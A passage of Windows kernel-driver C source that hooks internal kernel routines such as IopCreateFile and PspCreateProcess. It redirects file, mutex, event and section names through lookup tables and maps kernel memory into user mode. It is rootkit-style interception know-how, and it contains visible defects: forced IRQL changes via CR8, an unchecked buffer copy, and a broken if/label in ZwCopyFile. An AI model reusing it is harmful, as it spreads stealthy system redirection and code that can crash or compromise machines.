	KIRQL IRQL = KeGetCurrentIrql();   // __readcr8();
	__writecr8(PASSIVE_LEVEL);
	LONG r = -1;
	__try
	{
		r = RtlCompareUnicodeString(&Left->stringSrc, &Right->stringSrc, TRUE);
		//if (r != 0){

		//	if (Left->stringSrc.Length < Right->stringSrc.Length)
		//	{
		//		if (FsRtlIsNameInExpression(&Left->stringSrc, &Right->stringSrc, FALSE, NULL)) {
		//			r = 0;
		//		}

		//	}
		//	else
		//	{
		//		if (FsRtlIsNameInExpression(&Right->stringSrc, &Left->stringSrc, FALSE, NULL)) {
		//			r = 0;
		//		}
		//	}
		//}
	}
	__except (1) {

	}
	__writecr8(IRQL);
	if (r > 0)
		return GenericGreaterThan;
	if (r < 0)
		return GenericLessThan;
	return GenericEqual;
}

_Function_class_(RTL_AVL_ALLOCATE_ROUTINE)
PVOID AllocateHandleTableEntryString(struct _RTL_AVL_TABLE* Table, CLONG  ByteSize)
{
	UNREFERENCED_PARAMETER(Table);
	PVOID buffer = ExAllocatePoolWithTag(NonPagedPool, ByteSize, 'tag');
	RtlZeroMemory(buffer, ByteSize);
	return buffer;
}

_Function_class_(RTL_AVL_FREE_ROUTINE)
VOID FreeHandleTableEntryString(struct _RTL_AVL_TABLE* Table, PVOID  Buffer)
{
	UNREFERENCED_PARAMETER(Table);
	ExFreePoolWithTag(Buffer, 'tag');
}

typedef NTSTATUS(NTAPI* fNtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
	PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
	ULONG ShareAccess, ULONG CreateDisposition,
	ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);



typedef NTSTATUS(NTAPI* fObCreateObjectEx)(
	KPROCESSOR_MODE ProbeMode,
	POBJECT_TYPE ObjectType,
	POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	KPROCESSOR_MODE OwnershipMode,
	PVOID ParseContext OPTIONAL,
	ULONG ObjectBodySize,
	ULONG PagedPoolCharge,
	ULONG NonPagedPoolCharge,
	PVOID* Object,
	__int64 Flags
	);



typedef NTSTATUS(NTAPI* fObOpenObjectByName)(
	POBJECT_ATTRIBUTES ObjectAttributes,
	POBJECT_TYPE ObjectType OPTIONAL,
	KPROCESSOR_MODE AccessMode,
	PACCESS_STATE AccessState OPTIONAL,
	ACCESS_MASK DesiredAccess OPTIONAL,
	PVOID ParseContext OPTIONAL,
	PHANDLE Handle
	);



typedef NTSTATUS(__stdcall* fpIopCreateFile)(
	PHANDLE FileHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK IoStatusBlock,
	PLARGE_INTEGER AllocationSize,
	ULONG FileAttributes,
	ULONG ShareAccess,
	ULONG Disposition,
	ULONG CreateOptions,
	PVOID EaBuffer,
	ULONG EaLength,
	CREATE_FILE_TYPE CreateFileType,
	PVOID InternalParameters,
	ULONG Options,
	ULONG Flags,
	PIO_DRIVER_CREATE_CONTEXT DriverContext);




typedef __int64(__fastcall* fMiFreeUltraMapping)(unsigned __int64 a1);


//typedef __int64(__fastcall* fIopCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
//	POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
//	PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
//	ULONG ShareAccess, ULONG CreateDisposition,
//	ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength, __int64 a12,
//	SLIST_ENTRY* a13,
//	__int64 a14,
//	__int64 a15,
//	__int64* Src);

typedef NTSTATUS(__fastcall* fPspCreateProcess)(
	PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort);

typedef NTSTATUS(__fastcall* fMiCreateSectionCommon)(
	PHANDLE SectionHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER MaximumSize,
	ULONG SectionPageProtection,
	int a6,
	__int64 a7,
	volatile void* Address,
	int a8,
	int Flags);



fNtCreateFile TrueNtCreateFile = 0;
fpIopCreateFile TrueIopCreateFile = 0;
fPspCreateProcess TruePspCreateProcess = 0;
fMiCreateSectionCommon TrueMiCreateSectionCommon = 0;
fObCreateObjectEx TrueObCreateObjectEx = 0;
fObOpenObjectByName TrueObOpenObjectByName = 0;
fMiFreeUltraMapping TrueMiFreeUltraMapping = 0;


LONG  findUnicodeWchar(PUNICODE_STRING stringU, wchar_t A) {
	for (LONG i = (stringU->Length / 2) - 1; i > 0; i--) {
		if (stringU->Buffer[i] == A) {
			return i;
		}
	}
	return -1;
}


AVL_INFO  TableAvl_UNICODE_STRING;
AVL_INFO  TableAvl_UNICODE_PROCESS;


AVL_INFO  TableAvl_UNICODE_METUX;
AVL_INFO  TableAvl_UNICODE_EVENT;
AVL_INFO  TableAvl_UNICODE_SECTION;

AVL_INFO  TableAvl_MEYUX_1;

//--------------- Find 查找
PTABLE_UNICODE_STRING_FILTER findUnicodeStringAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {
	return AVL_LOCK_CHANGE_VOID(AVL_GET, &TableAvl_UNICODE_STRING, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}

PTABLE_UNICODE_STRING_FILTER findCreateProcessAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {
	return AVL_LOCK_CHANGE_VOID(AVL_GET, &TableAvl_UNICODE_PROCESS, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}

PTABLE_UNICODE_STRING_FILTER findMutexAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {
	return AVL_LOCK_CHANGE_VOID(AVL_GET, &TableAvl_UNICODE_METUX, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}

PTABLE_UNICODE_STRING_FILTER findEventAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {
	return AVL_LOCK_CHANGE_VOID(AVL_GET, &TableAvl_UNICODE_EVENT, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}

PTABLE_UNICODE_STRING_FILTER findSectionAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {
	return AVL_LOCK_CHANGE_VOID(AVL_GET, &TableAvl_UNICODE_SECTION, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}



BOOLEAN DelMutexAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {
	return (BOOLEAN)AVL_LOCK_CHANGE_VOID(AVL_DEL, &TableAvl_UNICODE_METUX, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}

BOOLEAN DelEventAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {
	return (BOOLEAN)AVL_LOCK_CHANGE_VOID(AVL_DEL, &TableAvl_UNICODE_EVENT, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}

BOOLEAN DelSectionAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {
	return (BOOLEAN)AVL_LOCK_CHANGE_VOID(AVL_DEL, &TableAvl_UNICODE_SECTION, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}





PTABLE_HANDLE_INFO findMetuxAvl_0(PTABLE_HANDLE_INFO TalbeAvl) {

	return AVL_LOCK_CHANGE_VOID(AVL_GET, &TableAvl_MEYUX_1, TalbeAvl, sizeof(TABLE_HANDLE_INFO));
	//PTABLE_HANDLE_INFO* pTable = (PTABLE_HANDLE_INFO)RtlLookupElementGenericTableAvl(&TableAvl_MEYUX_1, TalbeAvl);

	//return pTable;
}


// 添加
BOOLEAN wAddEntryStringAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {

	return (BOOLEAN)AVL_LOCK_CHANGE_VOID(AVL_ADD, &TableAvl_UNICODE_STRING, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}

BOOLEAN wAddCreateProcessAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {

	return (BOOLEAN)AVL_LOCK_CHANGE_VOID(AVL_ADD, &TableAvl_UNICODE_PROCESS, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}

BOOLEAN wAddMutexAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {
	return (BOOLEAN)AVL_LOCK_CHANGE_VOID(AVL_ADD, &TableAvl_UNICODE_METUX, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}

BOOLEAN wAddEventAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {
	return (BOOLEAN)AVL_LOCK_CHANGE_VOID(AVL_ADD, &TableAvl_UNICODE_EVENT, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}

BOOLEAN wAddSectionAvl(PTABLE_UNICODE_STRING_FILTER TalbeAvl) {
	return (BOOLEAN)AVL_LOCK_CHANGE_VOID(AVL_ADD, &TableAvl_UNICODE_SECTION, TalbeAvl, sizeof(TABLE_UNICODE_STRING_FILTER));
}


BOOLEAN wAddMetuxAvl_0(PTABLE_HANDLE_INFO TalbeAvl) {

	return (BOOLEAN)AVL_LOCK_CHANGE_VOID(AVL_ADD, &TableAvl_MEYUX_1, TalbeAvl, sizeof(TABLE_HANDLE_INFO));
	//BOOLEAN r = FALSE;
	//if (RtlInsertElementGenericTableAvl(&TableAvl_MEYUX_1, TalbeAvl, sizeof(TABLE_HANDLE_INFO), &r) == NULL)
	//	return FALSE;
	//return r;
}


// 删除


//RtlInitializeGenericTableAvl(&TableAvl_1, CompareHandleTableEntry, AllocateHandleTableEntry, FreeHandleTableEntry, NULL);

BOOLEAN FilterFileName(PUNICODE_STRING FilterName, PUNICODE_STRING PathName) {


	__try
	{
		if (!bIniFilterFile) {
			bIniFilterFile = IniFilterFile();
		}
		if (bIniFilterFile)
		{
			TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
			RtlCopyMemory(&sFilter.stringSrc, FilterName, sizeof(UNICODE_STRING));
			RtlCopyMemory(&sFilter.stringReplace, PathName, sizeof(UNICODE_STRING));
			LOG_DEBUG("%wZ  %wZ\n", &sFilter.stringSrc, &sFilter.stringReplace);
			return wAddEntryStringAvl(&sFilter);
		}
	}
	__except (1) {
		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}


	return FALSE;
}

BOOLEAN FilterMutexName(PUNICODE_STRING FilterName, PUNICODE_STRING PathName) {

	__try
	{
		if (!bIniFilterMutex) {
			bIniFilterMutex = IniFilterMutex();
		}
		if (bIniFilterMutex)
		{
			TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
			RtlCopyMemory(&sFilter.stringSrc, FilterName, sizeof(UNICODE_STRING));
			RtlCopyMemory(&sFilter.stringReplace, PathName, sizeof(UNICODE_STRING));
			LOG_DEBUG("%wZ  %wZ\n", &sFilter.stringSrc, &sFilter.stringReplace);
			return wAddMutexAvl(&sFilter);
		}
	}
	__except (1) {

		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}


	return FALSE;
}

BOOLEAN FilterEventName(PUNICODE_STRING FilterName, PUNICODE_STRING PathName) {
	//IoCreateFile()

	__try
	{
		if (!bIniFilterMutex) {
			bIniFilterMutex = IniFilterMutex();
		}
		if (bIniFilterMutex)
		{
			TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
			RtlCopyMemory(&sFilter.stringSrc, FilterName, sizeof(UNICODE_STRING));
			RtlCopyMemory(&sFilter.stringReplace, PathName, sizeof(UNICODE_STRING));
			LOG_DEBUG("%wZ  %wZ\n", &sFilter.stringSrc, &sFilter.stringReplace);
			return wAddEventAvl(&sFilter);
		}
	}
	__except (1) {

		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}


	return FALSE;
}

BOOLEAN FilterSectionName(PUNICODE_STRING FilterName, PUNICODE_STRING PathName) {
	//IoCreateFile()

	__try
	{
		if (!bIniFilterMutex) {
			bIniFilterMutex = IniFilterMutex();
		}
		if (bIniFilterMutex)
		{
			TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
			RtlCopyMemory(&sFilter.stringSrc, FilterName, sizeof(UNICODE_STRING));
			RtlCopyMemory(&sFilter.stringReplace, PathName, sizeof(UNICODE_STRING));
			LOG_DEBUG("%wZ  %wZ\n", &sFilter.stringSrc, &sFilter.stringReplace);
			return wAddSectionAvl(&sFilter);
		}
	}
	__except (1) {
		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}


	return FALSE;
}

BOOLEAN FilterProcessName(PUNICODE_STRING FilterName, PUNICODE_STRING PathName)
{

	__try
	{
		if (!bIniFilterProcess) {
			bIniFilterProcess = IniFilterProcess();
		}
		if (bIniFilterProcess)
		{
			TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
			RtlCopyMemory(&sFilter.stringSrc, FilterName, sizeof(UNICODE_STRING));
			RtlCopyMemory(&sFilter.stringReplace, PathName, sizeof(UNICODE_STRING));
			return wAddCreateProcessAvl(&sFilter);
		}
	}
	__except (1) {

		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}


	return FALSE;
}



NTSTATUS  hNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
	PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
	ULONG ShareAccess, ULONG CreateDisposition,
	ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength) {

	if (ObjectAttributes &&
		ObjectAttributes->ObjectName &&
		ObjectAttributes->ObjectName->Buffer)
	{
		////LOG_DEBUG("way: %ws\n", ObjectAttributes->ObjectName->Buffer);
		////wchar_t FileName[256] = { 0 };
		////LONG iPos = findUnicodeWchar(ObjectAttributes->ObjectName, '\\');
		////if (iPos != -1) {
		////	RtlCopyMemory(FileName, &ObjectAttributes->ObjectName->Buffer[iPos + 1], ObjectAttributes->ObjectName->Length - (iPos + 1));
		////	LOG_DEBUG("1---way: %ws\n", FileName);
		////}
		////else
		////{
		////	RtlCopyMemory(FileName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
		////	LOG_DEBUG("2---way: %ws\n", FileName);
		////}
		////TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
		////RtlInitUnicodeString(&sFilter.stringSrc, FileName);
		//PTABLE_UNICODE_STRING_FILTER pVl = findUnicodeStringAvl(&sFilter);
		//if (pVl != 0) {
		//	RtlInitUnicodeString(ObjectAttributes->ObjectName, pVl->stringReplace.Buffer);
		//}
	}
	return TrueNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes,
		IoStatusBlock, AllocationSize, FileAttributes,
		ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}

//--------------------------------------------------------------------------------------------------


NTSTATUS ZwCopyFile(PUNICODE_STRING DestinationFileName, PUNICODE_STRING SourceFileName)
{
	NTSTATUS status;
	HANDLE SourceFileHandle = NULL;
	HANDLE DestinationFileHandle = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	IO_STATUS_BLOCK IoStatusBlock;
	FILE_STANDARD_INFORMATION FileInfo;
	SIZE_T AllocationSize = 0;
	PVOID FileBuffer = NULL;
	BOOLEAN bAllocateInVirtualMemory = FALSE;

	InitializeObjectAttributes(&ObjectAttributes,
		SourceFileName,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);
	status = IoCreateFile(&SourceFileHandle,
		GENERIC_READ | SYNCHRONIZE,
		&ObjectAttributes,
		&IoStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0,
		CreateFileTypeNone,
		0,
		IO_NO_PARAMETER_CHECKING);

	if (!NT_SUCCESS(status))
	{
		//DbgPrint("IoCreateFile (%wZ) failed,eid=0x%08x\n", SourceFileName, status);
		goto cleanup;
	}

	//DbgPrint("Open %wZ success!\n",SourceFileName);

	status = ZwQueryInformationFile(
		SourceFileHandle,
		&IoStatusBlock,
		(PVOID)&FileInfo,
		sizeof(FileInfo),
		FileStandardInformation);
	if (!NT_SUCCESS(status))
	{
		//DbgPrint("ZwQueryFileInformation (%wZ) failed,eid=0x%08x\n", SourceFileName, status);
		goto cleanup;
	}

	//DbgPrint("ZwQueryInformationFile success!\n");

	AllocationSize = FileInfo.AllocationSize.LowPart;

	FileBuffer = ExAllocatePoolWithTag(PagedPool, AllocationSize, 'CODE');
	if (!FileBuffer)
	{
		status = ZwAllocateVirtualMemory((HANDLE)(-1),
			(PVOID)&FileBuffer,
			0,
			&AllocationSize,
			MEM_COMMIT,
			PAGE_READWRITE);
		if (!NT_SUCCESS(status))
		{
			//DbgPrint("Cannot Allocate Such Large Buffer!\n");
			goto cleanup;
		}
		bAllocateInVirtualMemory = TRUE;
	}
	ULONG fSize = (ULONG)AllocationSize;

	status = ZwReadFile(SourceFileHandle,
		NULL,
		NULL,
		NULL,
		&IoStatusBlock,
		FileBuffer,
		fSize,
		NULL,
		NULL);

	if (!NT_SUCCESS(status))
	{
		//DbgPrint("ZwReadFile (%wZ) failed,eid=0x%08x\n", SourceFileName, status);
		goto cleanup;
	}

	InitializeObjectAttributes(&ObjectAttributes,
		DestinationFileName,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);
	status = IoCreateFile(&DestinationFileHandle,
		GENERIC_READ | GENERIC_WRITE,
		&ObjectAttributes,
		&IoStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		FILE_OVERWRITE_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0,
		CreateFileTypeNone,
		NULL,
		IO_NO_PARAMETER_CHECKING);
	if (!NT_SUCCESS(status))
	{
		//DbgPrint("IoCreateFile (%wZ) failed,eid=0x%08x\n", DestinationFileName, status);
		goto cleanup;
	}

	status = ZwWriteFile(DestinationFileHandle,
		NULL,
		NULL,
		NULL,
		&IoStatusBlock,
		FileBuffer,
		fSize,
		NULL,
		NULL);

	if (!NT_SUCCESS(status))
		//DbgPrint("ZwWriteFile (%wZ) failed,eid=0x%08x\n", DestinationFileName, status);

cleanup:
	if (bAllocateInVirtualMemory)
		ZwFreeVirtualMemory((HANDLE)(-1), (PVOID)&FileBuffer, &AllocationSize, MEM_RELEASE);
	else if (FileBuffer)
		ExFreePoolWithTag(FileBuffer, 'CODE');
	if (SourceFileHandle)
		ZwClose(SourceFileHandle);
	if (DestinationFileHandle)
		ZwClose(DestinationFileHandle);

	return status;
}



NTKERNELAPI NTSTATUS __stdcall ZwProtectVirtualMemory(HANDLE ProcessHandle,
	PVOID* BaseAddress,
	PULONGLONG ProtectSize,
	ULONG NewProtect,
	PULONG OldProtect);



//#define VIRTUAL_ADDRESS_BITS 48
//#define VIRTUAL_ADDRESS_MASK ((((ULONG_PTR)1) << VIRTUAL_ADDRESS_BITS) - 1)
//
//#define MiGetPdeAddress(va)  \
//    ((PMMPTE)(((((ULONG_PTR)(va) & VIRTUAL_ADDRESS_MASK) >> PDI_SHIFT) << PTE_SHIFT) + PDE_BASE))
//#define MiGetPteAddress(va) \
//    ((PMMPTE)(((((ULONG_PTR)(va) & VIRTUAL_ADDRESS_MASK) >> PTI_SHIFT) << PTE_SHIFT) + PTE_BASE))



#include "PhysicalMemory.h"

PVOID  LoadMemoryToUser(PMDL* pMdl, PVOID addr, DWORD nSize, KPROCESSOR_MODE Mode, ULONG Protect) {

	PVOID Buffer = 0;
	NTSTATUS status = STATUS_SUCCESS;
	*pMdl = IoAllocateMdl(addr, nSize, 0, 0, NULL);
	if (*pMdl == 0)
	{
		LOG_DEBUG(" LoadMemoryToUser IoAllocateMdl %d\n", __LINE__);
		return 0;
	}
	//LOG_DEBUG(" LoadMemoryToUser  %d\n", __LINE__);



	//// 获取当前进程的EPROCESS结构
	//PEPROCESS CurrentProcess = PsGetCurrentProcess();

	//// 获取当前进程的页目录PDE
	//PMMPTE DirectoryTableEntry = MiGetPdeAddress(CurrentProcess);

	//// 根据需要取得的虚拟地址，计算出页表项的索引
	//ULONG DirectoryIndex = VAD_TO_DIR_INDEX(VirtualAddress);
	//ULONG TableIndex = VAD_TO_TABLE_INDEX(VirtualAddress);

	//// 获取页目录项PDE
	//PMMPTE Pde = DirectoryTableEntry[DirectoryIndex];

	//// 如果PDE指向页表，则获取页表项PTE
	//PMMPTE PageTableEntry = MiGetVirtualAddressMappedByPte(Pde);
	//PMMPTE Pte = PageTableEntry[TableIndex];



	//ULONGLONG bLarg =  MI_IS_PHYSICAL_ADDRESS2(addr);

	__try
	{
	 	 // 锁定到内核空间
		//  MmProbeAndLockPages 



		


		MmBuildMdlForNonPagedPool(*pMdl); // 到用户空间的映射



		//KeLeaveGuardedRegion();
		//MmMapLockedPages(*pMdl, Mode);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		IoFreeMdl(*pMdl);
		LOG_DEBUG(" LoadMemoryToUser MmBuildMdlForNonPagedPool %d   %08X\n", __LINE__, GetExceptionCode());
		return 0;
	}
	//	LOG_DEBUG(" LoadMemoryToUser  %d\n",__LINE__);
	__try {
		Buffer = MmMapLockedPagesSpecifyCache(*pMdl, Mode, MmCached, NULL, FALSE, NormalPagePriority);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		IoFreeMdl(*pMdl);
		LOG_DEBUG(" LoadMemoryToUser MmMapLockedPagesSpecifyCache %d %08X\n", __LINE__, GetExceptionCode());
		return 0;
	}
	//LOG_DEBUG(" LoadMemoryToUser  %d\n", __LINE__);
	if (Mode == KernelMode)
	{
		if (Protect != PAGE_READWRITE)
		{
			status = MmProtectMdlSystemAddress(*pMdl, Protect);
			//MmProtectMdlSystemAddress()
			if (!NT_SUCCESS(status))
			{
				MmUnmapLockedPages(Buffer, *pMdl);
				IoFreeMdl(*pMdl);
				LOG_DEBUG(" LoadMemoryToUser MmProtectMdlSystemAddress %d\n", __LINE__);
				return 0;
			}
		}
		return Buffer;
	}
	else
	{
		//status = MmProtectMdlSystemAddress(*pMdl, Protect);
		//SIZE_T regionSize;
		////regionSize = sizeof(UCHAR);


		//HANDLE ProcessHandle = 0;
		//status = ObOpenObjectByPointer(
		//	PsGetCurrentProcess(),
		//	0,
		//	NULL,
		//	PROCESS_ALL_ACCESS,
		//	*PsProcessType,
		//	KernelMode, //UserMode,
		//	&ProcessHandle);
		//ZwProtectVirtualMemory
		//if (NT_SUCCESS(status))
		//{
		//	ULONG oldProtection = 0;
		//	status = ZwProtectVirtualMemory(ProcessHandle,
		//		&Buffer,
		//		&nSize,
		//		Protect,
		//		&oldProtection);
		//}

		//ULONG oldProtection = 0;
		//HANDLE  hProcess;
		//CLIENT_ID ClientId;
		//OBJECT_ATTRIBUTES ObjAttr = {0};
		//ClientId.UniqueProcess = (HANDLE)PsGetCurrentProcessId();
		//ClientId.UniqueThread = 0;

		//status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClientId);


		//MmProtectVirtualMemory
		//Mmprot







	}
	return Buffer;
}



extern ULONG_PTR kernelBase;

PVOID  LoadMemoryUserToKernel(PMDL* pMdl, PVOID addr, DWORD nSize, ULONG Protect) {

	PVOID Buffer = 0;
	NTSTATUS status = STATUS_SUCCESS;
	*pMdl = IoAllocateMdl(addr, nSize, 0, 0, NULL);
	if (*pMdl == 0)
	{
		LOG_DEBUG(" %s IoAllocateMdl %d\n", __FUNCTION__, __LINE__);
		return 0;
	}
	//LOG_DEBUG(" LoadMemoryToUser  %d\n", __LINE__);
	__try
	{
		MmBuildMdlForNonPagedPool(*pMdl);
		//KeLeaveGuardedRegion();
		//MmMapLockedPages(*pMdl, Mode);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		IoFreeMdl(*pMdl);
		LOG_DEBUG(" LoadMemoryToUser MmBuildMdlForNonPagedPool %d   %08X\n", __LINE__, GetExceptionCode());
		return 0;
	}
	//	LOG_DEBUG(" LoadMemoryToUser  %d\n",__LINE__);

	__try {

		Buffer = MmMapLockedPagesSpecifyCache(*pMdl, KernelMode, MmCached, kernelBase | 0xFFFFFFFF, FALSE, NormalPagePriority);

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		IoFreeMdl(*pMdl);
		LOG_DEBUG(" LoadMemoryToUser MmMapLockedPagesSpecifyCache %d %08X\n", __LINE__, GetExceptionCode());
		return 0;
	}
	//LOG_DEBUG(" LoadMemoryToUser  %d\n", __LINE__);
	status = MmProtectMdlSystemAddress(*pMdl, Protect);
	//MmProtectMdlSystemAddress()
	if (!NT_SUCCESS(status))
	{
		MmUnmapLockedPages(Buffer, *pMdl);
		IoFreeMdl(*pMdl);
		LOG_DEBUG(" LoadMemoryToUser MmProtectMdlSystemAddress %d\n", __LINE__);
		return 0;
	}
	return Buffer;
//
}







typedef struct _GlobalMemUser {
	PMDL pMdl;   // mdl
	PVOID kenerlAdr; // 内核申请的内存地址
	PVOID pAdr; //
}GlobalMemUser;


void ExFreeGlobalMemUser(GlobalMemUser* pMemUser) {
	__try
	{
		if (pMemUser != 0) {
			MmUnmapLockedPages(pMemUser->pAdr, pMemUser->pMdl);
			IoFreeMdl(pMemUser->pMdl);
			ExFreePoolWithTag(pMemUser->kenerlAdr, 'tag');
		}
	}
	__except (1) {

		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());

	}
}


PVOID ExAllocateMemUser(size_t size, GlobalMemUser* pMemUser) {

	__try
	{
		PVOID pMemory = ExAllocatePoolWithTag(NonPagedPool, size, 'tag');
		if (pMemory == NULL) {
			LOG_DEBUG("Memory ExAllocatePoolWithTag error\n");
			return NULL;
		}
		PMDL pMdl = 0;
		PVOID Addr = LoadMemoryToUser(&pMdl, pMemory, size, UserMode, PAGE_READWRITE);
		if (Addr == 0) {
			ExFreePoolWithTag(pMemory, 'tag');
			return NULL;
		}
		RtlZeroMemory(Addr, size);
		pMemUser->pMdl = pMdl;
		pMemUser->kenerlAdr = pMemory;
		pMemUser->pAdr = Addr;
		return Addr;
	}
	__except (1) {

		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}

	return 0;
}



//BOOLEAN  AdjustObjectAttributes(POBJECT_ATTRIBUTES ObjectAttributes, GlobalMemUser* pMemUser) {
//
//
//
//
//
//
//
//}





__int64 __fastcall wIopCreateFile(PHANDLE FileHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK IoStatusBlock,
	PLARGE_INTEGER AllocationSize,
	ULONG FileAttributes,
	ULONG ShareAccess,
	ULONG Disposition,
	ULONG CreateOptions,
	PVOID EaBuffer,
	ULONG EaLength,
	CREATE_FILE_TYPE CreateFileType,
	PVOID InternalParameters,
	ULONG Options,
	ULONG Flags,
	PIO_DRIVER_CREATE_CONTEXT DriverContext) {


	//IoCreateFile

	//PUNICODE_STRING bString = 0;
	//UNICODE_STRING mStringVal;
	__try
	{

		wchar_t* pString = 0;
		if (ObjectAttributes &&
			ObjectAttributes->ObjectName &&
			ObjectAttributes->ObjectName->Length)
		{
			//	LOG_DEBUG("way: %ws\n", ObjectAttributes->ObjectName->Buffer);
			__try {
				wchar_t FileName[MAX_PATH] = { 0 };
				LONG iPos = findUnicodeWchar(ObjectAttributes->ObjectName, '\\');
				if (iPos != -1) {

					DWORD cLen = ObjectAttributes->ObjectName->Length - (iPos + 1) * 2;
					if (cLen > sizeof(FileName))
					{
						LOG_DEBUG("ERROR: Size:%d\n", cLen);
					}
					else
					{
						__try {

							RtlCopyMemory(FileName, &ObjectAttributes->ObjectName->Buffer[iPos + 1], cLen);
						}
						__except (1) {
							LOG_DEBUG("__except  Len %d  %d %d %d \n", ObjectAttributes->ObjectName->Length,
								cLen, iPos);
						}
					}
				}
				else {

					RtlCopyMemory(FileName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);

				}
				TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
				RtlInitUnicodeString(&sFilter.stringSrc, FileName);
				PTABLE_UNICODE_STRING_FILTER pVl = findUnicodeStringAvl(&sFilter);
				if (pVl != 0) {

					LOG_DEBUG("1---way:%ws  <%p> <%08X>\n",
						ObjectAttributes->ObjectName->Buffer,
						ObjectAttributes->ObjectName->Buffer,
						ObjectAttributes->Attributes);

					//LOG_DEBUG("z---way:<%08X>\n",);

					GlobalMemUser MemUser = { 0 };
					PVOID Addr = ExAllocateMemUser(pVl->stringReplace.Length + 2, &MemUser);
					if (Addr != 0)
					{
						//RtlZeroMemory(Addr, pVl->stringReplace.Length + 2);
						RtlCopyMemory(Addr, pVl->stringReplace.Buffer, pVl->stringReplace.Length);
						wchar_t* pString = ObjectAttributes->ObjectName->Buffer;
						RtlInitUnicodeString(ObjectAttributes->ObjectName, Addr);

						//RemoveEntryList()

						LOG_DEBUG("2---way:%ws  <%p> <%08X>\n",
							ObjectAttributes->ObjectName->Buffer,
							ObjectAttributes->ObjectName->Buffer,
							ObjectAttributes->Attributes);

						//LOG_DEBUG("Memory ExAllocatePoolWithTag error111\n");
						NTSTATUS RNT = TrueIopCreateFile(FileHandle, DesiredAccess, ObjectAttributes,
							IoStatusBlock, AllocationSize, FileAttributes, ShareAccess,
